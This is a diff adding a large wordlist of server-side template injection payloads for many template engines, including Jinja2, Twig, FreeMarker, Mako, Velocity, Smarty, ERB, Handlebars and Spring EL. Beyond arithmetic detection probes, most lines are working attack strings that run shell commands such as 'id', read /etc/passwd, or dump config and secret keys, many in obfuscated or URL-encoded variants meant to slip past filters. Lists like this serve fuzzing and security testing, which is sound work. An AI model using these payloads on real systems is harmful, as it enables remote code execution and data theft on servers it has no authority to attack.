@@ -1,0 +1,478 @@
+
+{{4*4}}[[5*5]]
+{{ 4*4 }}[[5*5]]
+{{7*7}}
+%7B# c #%7D%7B%7B7*7%7D%7D
+{{7*'7'}}
+%7B%7B 7*'7' %7D%7D
+<%= 7 * 7 %>
+<% = 7 * 7  %>
+${3*3}
+$%7B3*3%7D
+${{7*7}}
+${{7*7}}{# _ #}
+@(1+2)
+@%281+2%29
+#{3*3}
+#%7B3*3%7D
+#{ 7 * 7 }
+#%7B 7 * 7 %7D
+{{dump(app)}}
+{{dump(app)}}{# _ #}
+{{app.request.server.all|join(',')}}
+{{app.request["server"].all|join(',')}}
+{{config.items()}}
+{# c #}{{config.items()}}
+{{ [].class.base.subclasses() }}
+{{ []["class"]["base"]["subclasses"]() }}
+{{''.class.mro()[1].subclasses()}}
+{{''["class"].mro()[1]["subclasses"]()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+%7B%7B
+ ''.__class__.__mro__[2].__subclasses__%28%29 %7D%7D
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+%7B% for key, value in config.iteritems%28%29 %%7D<dt>%7B%7B  key|e  %7D%7D</dt><dd>%7B%7B  value|e  %7D%7D</dd>%7B% endfor %%7D
+{{'a'.toUpperCase()}}
+{{
+'a'.toUpperCase()}}
+{{ request }}
+%7B%7B request %7D%7D
+{{self}}
+{{ cycler }}
+<%= File.open('/etc/passwd').read %>
+<%= File.open('/e'+'tc/passwd').read %>
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+<#assign ex = "freemarker.template.utility.Execute"?new%28%29>$%7B ex%28"id"%29%7D
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+[#assign ex = 'freemarker["template"]["utility"].Execute'?new()]${  ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+$%7B"freemarker.template.utility.Execute"?new%28%29%28"id"%29%7D
+{{app.request.query.filter(0,0,1024,{'options':'system'})}}
+%7B%7Bapp.request.query.filter%280,0,1024,%7B'options':'system'%7D%29%7D%7D
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}{# _ #}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{ namespace.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{request.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+%7B%7B config.__class__.__init__.__globals__['os'].popen%28'ls'%29.read%28%29 %7D%7D
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+%7B% for x in %28%29['__class__'].__base__.__subclasses__%28%29 %%7D%7B% if "warning" in x["__name__"] %%7D%7B%7Bx%28%29._module.__builtins__['__import__']%28'os'%29['popen']%28request["args"].input%29["read"]%28%29%7D%7D%7B%endif%%7D%7B%endfor%%7D
+{$smarty.version}
+{$smarty['ve'+'rsion']}
+{php}echo `id`;{/php}
+%7Bphp%7Decho `id`;%7B/php%7D
+{{['id']|filter('system')}}
+{# c #}{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{# c #}{{['cat\x'+'20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{ ['cat$IFS/etc/passwd']|filter('system') }}
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{ request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) }}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}{# _ #}
+{{request|attr(["__","class","__"]|join)}}
+{# c #}{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request|attr("__cla"+"ss__")}}
+{{request.__class__}}
+%7B%7Brequest.__class__%7D%7D
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x'+'5f\x5f')('\x5f\x5fbui'+'ltins\x5f\x5f')|attr('\x5'+'f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\'+'x5f')('os')|attr('pop'+'en')('id')|attr('re'+'ad')()}}
+${T(java.lang.System).getenv()}
+${ T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+$%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28'cat etc/passwd'%29%7D
+${self.module.cache.util.os.system("id")}
+${ self.module.cache.util.os.system("id")}
+${self.module.runtime.util.os.system("id")}
+${self.module["runtime"]["util"]['os']['system']("id")}
+${self.template.module.cache.util.os.system("id")}
+${self.template.module['cache']["util"].os.system("id")}
+${self.module.cache.compat.inspect.os.system("id")}
+${ self.module.cache.compat.inspect.os.system("id")}
+${self.__init__.__globals__['util'].os.system('id')}
+${self['__init__'].__globals__['util']["os"].system('id')}
+${self.template.module.runtime.util.os.system("id")}
+$%7Bself.template.module.runtime.util.os.system%28"id"%29%7D
+${self.module.filters.compat.inspect.os.system("id")}
+$%7Bself["module"].filters.compat["inspect"]["os"]['system']%28"id"%29%7D
+${self.module.runtime.compat.inspect.os.system("id")}
+$%7Bself.module.runtime.compat.inspect.os.system%28"id"%29%7D
+${self.module.runtime.exceptions.util.os.system("id")}
+$%7Bself.module.runtime.exceptions.util.os.system%28"id"%29%7D
+${self.template.__init__.__globals__['os'].system('id')}
+${ self.template.__init__.__globals__['os'].system('id')}
+${self.module.cache.util.compat.inspect.os.system("id")}
+${ self.module['cache'].util["compat"].inspect.os.system("id")}
+${self.module.runtime.util.compat.inspect.os.system("id")}
+$%7Bself.module.runtime.util.compat.inspect.os.system%28"id"%29%7D
+${self.template._mmarker.module.cache.util.os.system("id")}
+$%7Bself.template._mmarker.module.cache.util.os.system%28"id"%29%7D
+${self.template.module.cache.compat.inspect.os.system("id")}
+$%7Bself.template.module.cache.compat.inspect.os.system%28"id"%29%7D
+${self.module.cache.compat.inspect.linecache.os.system("id")}
+${self['module']['cache'].compat["inspect"]['linecache']['os']["system"]("id")}
+${self.template._mmarker.module.runtime.util.os.system("id")}
+$%7Bself.template._mmarker.module.runtime.util.os.system%28"id"%29%7D
+${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
+${self["attr"]._NSAttr__parent["module"]["cache"]["util"]["os"]['system']("id")}
+${self.template.module.filters.compat.inspect.os.system("id")}
+${ self.template.module.filters.compat.inspect.os.system("id")}
+${self.template.module.runtime.compat.inspect.os.system("id")}
+${ self.template.module.runtime.compat.inspect.os.system("id")}
+${self.module.filters.compat.inspect.linecache.os.system("id")}
+${self["module"].filters.compat["inspect"]["linecache"]["os"]['system']("id")}
+${self.module.runtime.compat.inspect.linecache.os.system("id")}
+${self["module"].runtime.compat["inspect"]['linecache']['os'].system("id")}
+${self.template.module.runtime.exceptions.util.os.system("id")}
+${ self.template.module.runtime.exceptions.util.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
+$%7Bself.attr._NSAttr__parent.module.runtime.util.os.system%28"id"%29%7D
+${self.context._with_template.module.cache.util.os.system("id")}
+${ self.context._with_template.module.cache.util.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.os.system("id")}
+${ self.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.template.module.cache.util.compat.inspect.os.system("id")}
+$%7Bself.template.module.cache.util.compat.inspect.os.system%28"id"%29%7D
+${self.context._with_template.module.runtime.util.os.system("id")}
+$%7Bself.context._with_template.module.runtime.util.os.system%28"id"%29%7D
+${self.module.cache.util.compat.inspect.linecache.os.system("id")}
+$%7Bself.module.cache.util.compat.inspect.linecache.os.system%28"id"%29%7D
+${self.template.module.runtime.util.compat.inspect.os.system("id")}
+$%7Bself.template.module.runtime.util.compat.inspect.os.system%28"id"%29%7D
+${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
+${ self.module.runtime.util.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
+$%7Bself.module.runtime.exceptions.traceback.linecache.os.system%28"id"%29%7D
+${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
+$%7Bself.module.runtime.exceptions.util.compat.inspect.os.system%28"id"%29%7D
+${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
+$%7Bself.template._mmarker.module.cache.compat.inspect.os.system%28"id"%29%7D
+${self.template.module.cache.compat.inspect.linecache.os.system("id")}
+$%7Bself.template.module.cache.compat.inspect.linecache.os.system%28"id"%29%7D
+${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
+${self.attr._NSAttr__parent["template"].module['cache'].util["os"]['system']("id")}
+${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
+${ self.template._mmarker.module.filters.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
+${self["template"]["_mmarker"]['module'].runtime.compat['inspect'].os["system"]("id")}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
+${self['attr']["_NSAttr__parent"].module.cache.compat.inspect["os"]['system']("id")}
+${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
+${ self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.filters.compat.inspect.linecache.os.system("id")}
+${self["template"]["module"]["filters"]['compat']['inspect'].linecache['os'].system("id")}
+${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
+$%7Bself.template.module.runtime.compat.inspect.linecache.os.system%28"id"%29%7D
+${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
+$%7Bself.attr._NSAttr__parent.template.module.runtime.util.os.system%28"id"%29%7D
+${self.context._with_template._mmarker.module.cache.util.os.system("id")}
+$%7Bself['context']._with_template["_mmarker"]['module'].cache["util"]['os']['system']%28"id"%29%7D
+${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
+$%7Bself.template.module.runtime.exceptions.compat.inspect.os.system%28"id"%29%7D
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
+$%7Bself.attr._NSAttr__parent.module.filters.compat.inspect.os.system%28"id"%29%7D
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
+${self["attr"]["_NSAttr__parent"]["module"].runtime["compat"].inspect.os.system("id")}
+${self.context._with_template.module.cache.compat.inspect.os.system("id")}
+$%7Bself.context._with_template.module.cache.compat.inspect.os.system%28"id"%29%7D
+${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
+$%7Bself.module.runtime.exceptions.compat.inspect.linecache.os.system%28"id"%29%7D
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
+${self.attr["_NSAttr__parent"]["module"]["runtime"]["exceptions"].util['os']["system"]("id")}
+${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
+${self.context['_with_template']['_mmarker']["module"]['runtime'].util.os['system']("id")}
+${self.context._with_template.module.filters.compat.inspect.os.system("id")}
+${self['context']["_with_template"]["module"]["filters"]["compat"]["inspect"]['os']['system']("id")}
+${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
+${self["context"]._with_template.module["runtime"]['compat'].inspect['os'].system("id")}
+${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
+$%7B self.context._with_template.module.runtime.exceptions.util.os.system%28"id"%29%7D
+${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
+$%7Bself.template.module.runtime.exceptions.traceback.linecache.os.system%28"id"%29%7D
+{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
+{# c #}{{self._TemplateReference__context["cycler"]['__init__']['__globals__']['os']}}
+{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
+%7B%7Bself._TemplateReference__context.joiner.__init__.__globals__.os%7D%7D
+{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
+{# c #}{{ self._TemplateReference__context.namespace.__init__.__globals__.os }}
+{{cycler.__init__.__globals__.os}}
+%7B%7B[].__init__.__globals__.os%7D%7D
+{{joiner.__init__.__globals__.os}}
+%7B%7Bjoiner.__init__.__globals__.os%7D%7D
+{{namespace.__init__.__globals__.os}}
+%7B%7Bnamespace.__init__.__globals__.os%7D%7D
+{{1+1}}
+%7B%7B1+1%7D%7D
+{{2*8}}
+{# c #}{{2*8}}
+{{12-5}}
+{# c #}{{12-5}}
+{{18/3}}
+{{ 18/3 }}
+{{20%6}}
+{{ 20%6 }}
+{{9*11}}
+{{9*11}}{# _ #}
+{{14+28}}
+{{ 14+28 }}
+{{50-17}}
+{{ 50-17 }}
+{{6*(2+3)}}
+{{ 6*(2+3) }}
+{{(15-5)*2}}
+%7B%7B%2815-5%29*2%7D%7D
+[[1+1]]
+[[3*9]]
+[[20-4]]
+[[18/2]]
+[[25%4]]
+[[8*12]]
+[[14+30]]
+[[100-25]]
+[[(6+2)*3]]
+[[%286+2%29*3]]
+[[(12-4)/2]]
+[[%2812-4%29/2]]
+{{2*'2'}}
+{{ 2*'2' }}
+{{3*'3'}}
+{{
+3*'3'}}
+<%= 1 + 1 %>
+<% = 1 + 1  %>
+<%= 2 * 9 %>
+<% = 2 * 9  %>
+<%= 20 - 5 %>
+<% = 20 - 5  %>
+<%= 18 / 3 %>
+<% = 18 / 3  %>
+<%= 100 % 9 %>
+<% = 100 % 9  %>
+<%= (7+2)*3 %>
+<%= %287+2%29*3 %>
+<%= 50-25 %>
+<% = 50-25  %>
+<%= 12*12 %>
+<% = 12*12  %>
+<%= (15-5)/2 %>
+<%= %2815-5%29/2 %>
+<%= 99+1 %>
+<% = 99+1  %>
+${1+1}
+$%7B1+1%7D
+${2*5}
+${ 2*5}
+${20-8}
+${ 20-8}
+${18/2}
+${ 18/2}
+${50%6}
+$%7B50%6%7D
+${7*11}
+$%7B7*11%7D
+${100-50}
+$%7B100-50%7D
+${9+12}
+$%7B9+12%7D
+${(8+2)*4}
+$%7B%288+2%29*4%7D
+${(30-6)/3}
+$%7B%2830-6%29/3%7D
+${{1+1}}
+$%7B %7B 1+1 %7D%7D
+${{2*8}}
+$%7B%7B2*8%7D%7D
+${{20-5}}
+${{20-5}}{# _ #}
+${{18/3}}
+${ { 18/3 }}{# _ #}
+${{45%8}}
+${ { 45%8 }}
+${{7*9}}
+$%7B%7B7*9%7D%7D
+${{30+12}}
+${{
+30+12}}
+${{100-25}}
+$%7B%7B100-25%7D%7D
+${{(6+2)*4}}
+${ { (6+2)*4 }}
+${{(24-6)/3}}
+{# c #}${{(24-6)/3}}
+@(2+2)
+@%282+2%29
+@(5*5)
+@%285*5%29
+@(20-10)
+@%2820-10%29
+@(18/6)
+@%2818/6%29
+@(100%9)
+@%28100%9%29
+@((8+2)*3)
+@%28%288+2%29*3%29
+@(15-7)
+@%2815-7%29
+@(40/5)
+@%2840/5%29
+@(9*9)
+@%289*9%29
+@(12+18)
+@%2812+18%29
+#{1+1}
+#%7B1+1%7D
+#{2*7}
+#%7B2*7%7D
+#{30-8}
+#%7B30-8%7D
+#{18/3}
+#%7B18/3%7D
+#{100%7}
+#%7B100%7%7D
+#{9*8}
+#%7B9*8%7D
+#{25+15}
+#%7B25+15%7D
+#{50-20}
+#%7B50-20%7D
+#{(7+3)*4}
+#%7B%287+3%29*4%7D
+#{(18-6)/2}
+#%7B%2818-6%29/2%7D
+#{ 1 + 1 }
+#%7B 1 + 1 %7D
+#{ 2 * 8 }
+#%7B 2 * 8 %7D
+#{ 20 - 5 }
+#%7B 20 - 5 %7D
+#{ 18 / 3 }
+#%7B 18 / 3 %7D
+#{ 100 % 9 }
+#%7B 100 % 9 %7D
+#{ 7 * 12 }
+#%7B 7 * 12 %7D
+#{ 15 + 25 }
+#%7B 15 + 25 %7D
+#{ 50 - 17 }
+#%7B 50 - 17 %7D
+#{ (6 + 2) * 4 }
+#%7B %286 + 2%29 * 4 %7D
+#{ (30 - 6) / 3 }
+#%7B %2830 - 6%29 / 3 %7D
+${{<%[%'"}}%\
+${ { <% [%'" }}%\
+{{'7'*7}}
+{# c #}{{'7'*7}}
+${7*'7'}
+$%7B7*'7'%7D
+{7*7}
+%7B7*7%7D
+#{7*7}
+#%7B7*7%7D
+[[${7*7}]]
+[[${ 7*7}]]
+{{= 7*7 }}
+{{ = 7*7  }}
+{{ . }}
+%7B%7B . %7D%7D
+{{printf "%s" "ssti"}}
+{{ printf "%s" "ssti" }}
+{{ .Password }}
+{# c #}{{ .Password }}
+{{ .System "ls" }}
+{{  .System "ls"  }}
+{{define "T1"}}ssti{{end}}{{template "T1"}}
+%7B%7Bdefine "T1"%7D%7Dssti%7B%7Bend%7D%7D%7B%7Btemplate "T1"%7D%7D
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}{# _ #}
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+{{
+#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
+#%7Bfunction%28%29%7BlocalLoad=global.process.mainModule.constructor._load;sh=localLoad%28"child_process"%29.exec%28'id'%29%7D%28%29%7D
+#{process.mainModule.require('child_process').execSync('id').toString()}
+#{process['mainModule']["require"]('child_process').execSync('id')["toString"]()}
+global.process.mainModule.require("child_process").execSync("id").toString()
+global.process.mainModule.require%28"child_process"%29.execSync%28"id"%29.toString%28%29
+={{ (function(){ const require = this.process.mainModule.require; return require("child_process").execSync("id").toString(); })() }}
+=%7B%7B  %28function%28%29%7B const require = this.process.mainModule.require; return require%28"child_process"%29.execSync%28"id"%29.toString%28%29; %7D%29%28%29  %7D%7D
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${ T(java.lang.Runtime).getRuntime().exec('id')}
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
+[[$%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28'id'%29%7D]]
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+__$%7BT%28java["lang"].Runtime%29['getRuntime']%28%29["exec"]%28'id'%29%7D__::["x"]
+${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\Z').next()}
+$%7Bnew java.util.Scanner%28new java.io.File%28'/etc/passwd'%29%29.useDelimiter%28'\Z'%29.next%28%29%7D
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign ex="freemarker.template.utility.Execute"?new%28%29>$%7Bex%28"id"%29%7D
+${product.class.protectionDomain.classLoader}
+${ product.class.protectionDomain.classLoader}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))
+#set%28$x=''%29#set%28$rt=$x['class'].forName%28'java["lang"]['Runtime']'%29%29#set%28$ex=$rt["getRuntime"]%28%29["exec"]%28'id'%29%29
+#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
+#set($e="e");$e["getClass"]().forName("java["lang"]['Runtime']").getMethod("getRuntime",null)['invoke'](null,null)['exec']("id")
+${__import__('os').popen('id').read()}
+$%7B__import__%28'os'%29.popen%28'id'%29.read%28%29%7D
+<%import os%>${os.popen('id').read()}
+<%import os%>$%7Bos['popen']%28'id'%29["read"]%28%29%7D
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os']['po'+'pen']('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}{# _ #}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+%7B%7Bjoiner.__init__.__globals__.os.popen%28'id'%29.read%28%29%7D%7D
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+%7B%7Bnamespace["__init__"].__globals__.os.popen%28'id'%29["read"]%28%29%7D%7D
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}{# _ #}
+{{ [].__class__.__base__.__subclasses__() }}
+%7B%7B [].__class__.__base__.__subclasses__%28%29 %7D%7D
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ request.__class__.__mro__[1].__subclasses__() }}{# _ #}
+{{''['\x5f\x5fclass\x5f\x5f']}}
+%7B%7B''['\x5f\x5f'+'class\x5f\x5f']%7D%7D
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}{# _ #}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')}}
+%7B%7Brequest|attr%28'application'%29|attr%28'\x5f\x5fglobals\x5f\x5f'%29|attr%28'\x5f\x5fgetitem\x5f\x5f'%29%28'os'%29%7D%7D
+{{['cat /etc/passwd']|filter('system')}}
+%7B%7B['cat /etc/passwd']|filter%28'system'%29%7D%7D
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("sys"+"tem")}}{{_self.env.getFilter("id")}}
+{{'/etc/passwd'|file_excerpt(1,30)}}
+%7B%7B'/etc/pass'+'wd'|file_excerpt%281,30%29%7D%7D
+{% for k,v in _self %}{{k}}{% endfor %}
+%7B% for k,v in _self %%7D%7B%7Bk%7D%7D%7B% endfor %%7D
+{php}system('id');{/php}
+%7Bphp%7Dsystem%28'id'%29;%7B/php%7D
+{system('id')}
+%7Bsystem%28'id'%29%7D
+{$smarty.template_object->smarty->_tag_stack}
+{$smarty['template_object']->smarty->_tag_stack}
+<%= system('id') %>
+<%= system%28'id'%29 %>
+<%= `id` %>
+<% = `id`  %>
+<%= IO.popen('id').read %>
+<%= IO["popen"]('id').read %>
+<%= File.read('/etc/passwd') %>
+<%= File["re"+"ad"]('/et'+'c/passwd') %>
+#{ %x(id) }
+#%7B %x%28id%29 %7D
+{{ settings.SECRET_KEY }}
+{{  settings.SECRET_KEY  }}
+{% debug %}
+%7B% debug %%7D
+{{config}}
+{{""}}
+{{_self}}
+{# c #}{{_self}}
+{{7*7}}[[${7*7}]]${7*7}#{7*7}<%=7*7%>
+{{ 7*7 }}[[${ 7*7}]]${ 7*7}#{7*7}<% =7*7 %>
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat${IFS}/etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('cat${IFS}'+'/etc/passwd',shell=True,stdout=-1)['comm'+'unicate']()[0].strip()}}
